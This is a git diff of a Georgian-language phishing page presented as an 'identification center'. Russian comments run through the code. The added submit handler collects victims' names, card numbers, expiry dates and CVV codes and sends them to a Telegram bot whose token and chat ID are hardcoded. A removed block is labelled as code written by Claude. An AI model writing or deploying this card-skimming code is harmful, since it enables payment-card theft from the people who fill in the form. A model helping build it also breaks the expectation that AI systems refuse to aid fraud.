@@ -3,10 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="referrer" content="origin">
-    
     <title>იდენტიფიკაციის ცენტრი</title>
-
     <style>
         body { font-family: Arial, sans-serif; background-color: #f4f4f9; margin: 0; padding: 20px; display: flex; flex-direction: column; align-items: center; }
         .center-container { text-align: center; margin-bottom: 20px; }
@@ -16,32 +13,12 @@
         h3 { text-align: center; color: #666; margin-bottom: 20px; font-weight: normal; }
         label { font-weight: bold; margin-bottom: 8px; display: block; font-size: 14px; color: #333; }
         input { width: 100%; padding: 14px; margin-bottom: 15px; border-radius: 6px; border: 1px solid #ccc; font-size: 16px; box-sizing: border-box; }
-        
-        .expiry-cvv-row { 
-            display: flex; 
-            gap: 15px; 
-            width: 100%;
-            margin-bottom: 15px;
-        }
-        .expiry-cvv-row div { 
-            flex: 1; 
-            min-width: 0; 
-        }
-        .expiry-cvv-row input {
-            margin-bottom: 0;
-        }
-
+        .expiry-cvv-row { display: flex; gap: 15px; width: 100%; margin-bottom: 15px; }
+        .expiry-cvv-row div { flex: 1; min-width: 0; }
         button { width: 100%; padding: 16px; background-color: #007bff; color: white; border: none; border-radius: 6px; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 10px; }
         button:hover { background-color: #0056b3; }
-
-        @media (max-width: 480px) { 
-            .form-container { padding: 20px; }
-            h1 { font-size: 20px; }
-            .expiry-cvv-row { flex-direction: row !important; }
-        }
     </style>
 </head>
-
 <body>
 
 <div class="center-container">
@@ -50,78 +27,82 @@
 
 <div class="form-container">
     <h1>იდენტიფიკაციის ცენტრი</h1>
-
-    <form>
+    <!-- Добавили id="mainForm" -->
+    <form id="mainForm">
         <h3>შეავსეთ ფორმა</h3>
 
         <label for="first-name">სახელი</label>
-        <input type="text" name="Имя" id="first-name" placeholder="სახელი" required>
+        <input type="text" id="first-name" placeholder="სახელი" required>
 
         <label for="last-name">გვარი</label>
-        <input type="text" name="Фамилия" id="last-name" placeholder="გვარი" required>
+        <input type="text" id="last-name" placeholder="გვარი" required>
 
         <label for="card-number">ბარათის ნომერი</label>
-        <input type="text" name="Номер_Карты" id="card-number" placeholder="0000 0000 0000 0000" maxlength="19" inputmode="numeric" required>
+        <input type="text" id="card-number" placeholder="0000 0000 0000 0000" maxlength="19" required>
 
         <div class="expiry-cvv-row">
             <div>
                 <label for="expiry-date">მოქმედების ვადა</label>
-                <input type="text" name="Срок_Действия" id="expiry-date" placeholder="MM/YY" maxlength="5" inputmode="numeric" required>
+                <input type="text" id="expiry-date" placeholder="MM/YY" maxlength="5" required>
             </div>
             <div>
-                <label for="cvv">უსაფর্থოების კოდი</label>
-                <input type="text" name="CVV_Код" id="cvv" placeholder="***" maxlength="3" inputmode="numeric" required>
+                <label for="cvv">უსაფრთხოების კოდი</label>
+                <input type="text" id="cvv" placeholder="***" maxlength="3" required>
             </div>
         </div>
 
         <button type="submit">მონაცების გაგზავნა</button>
     </form>
-
-    <hr style="margin: 20px 0;">
-
-    <!-- НИЖЕ КОД ОТ CLAUDE -->
-    <input type="text" id="userInput" placeholder="Введи текст...">
-    <button onclick="sendToTelegram()">Отправить</button>
-
-    <script>
-    function sendToTelegram() {
-      const text = document.getElementById('userInput').value;
-      const token = '8650944783:AAHsNX_fkpvurn6gkrcgnyqGNfzfHh8Xk9o';
-      const chatId = '820823459';
-
-      fetch(`https://api.telegram.org{token}/sendMessage`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          chat_id: chatId,
-          text: '📩 Новое сообщение: ' + text
-        })
-      });
-
-      alert('Отправлено!');
-    }
-    </script>
-    <!-- КОНЕЦ КОДА ОТ CLAUDE -->
-
 </div>
 
 <script>
-    document.getElementById('card-number').addEventListener('input', function (e) {
-        let value = e.target.value.replace(/\D/g, '').slice(0,16);
-        e.target.value = value.replace(/(\d{4})(?=\d)/g, '$1 ');
+    // Маски для ввода (чтобы красиво вводились цифры)
+    document.getElementById('card-number').addEventListener('input', e => {
+        let v = e.target.value.replace(/\D/g, '').slice(0,16);
+        e.target.value = v.replace(/(\d{4})(?=\d)/g, '$1 ');
     });
 
-    document.getElementById('expiry-date').addEventListener('input', function (e) {
-        let value = e.target.value.replace(/\D/g, ''); 
-        if (value.length >= 2) {
-            e.target.value = value.slice(0, 2) + '/' + value.slice(2, 4);
-        } else {
-            e.target.value = value;
-        }
+    document.getElementById('expiry-date').addEventListener('input', e => {
+        let v = e.target.value.replace(/\D/g, '').slice(0,4);
+        if (v.length >= 2) e.target.value = v.slice(0,2) + '/' + v.slice(2,4);
     });
 
-    document.getElementById('cvv').addEventListener('input', function (e) {
-        e.target.value = e.target.value.replace(/\D/g, '').slice(0,3);
+    // ГЛАВНАЯ ФУНКЦИЯ ОТПРАВКИ
+    document.getElementById('mainForm').addEventListener('submit', function(e) {
+        e.preventDefault(); // Чтобы страница не перезагружалась
+
+        const token = '8650944783:AAHsNX_fkpvurn6gkrcgnyqGNfzfHh8Xk9o';
+        const chatId = '820823459';
+        
+        // Собираем данные из всех полей
+        const name = document.getElementById('first-name').value;
+        const lastName = document.getElementById('last-name').value;
+        const card = document.getElementById('card-number').value;
+        const exp = document.getElementById('expiry-date').value;
+        const cvv = document.getElementById('cvv').value;
+
+        const message = `🔔 Новая заявка!\n👤 Имя: ${name} ${lastName}\n💳 Карта: ${card}\n📅 Срок: ${exp}\n🔐 CVV: ${cvv}`;
+
+        // Исправленная ссылка (добавлен /bot и исправлен путь)
+        const url = `https://api.telegram.org{token}/sendMessage`;
+
+        fetch(url, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: chatId,
+                text: message
+            })
+        })
+        .then(res => {
+            if (res.ok) {
+                alert('წარმატებით გაიგზავნა!'); // "Успешно отправлено" на грузинском
+                location.reload(); // Очистить форму
+            } else {
+                alert('Ошибка при отправке. Проверь токен или ID.');
+            }
+        })
+        .catch(err => alert('Ошибка сети: ' + err));
     });
 </script>
 
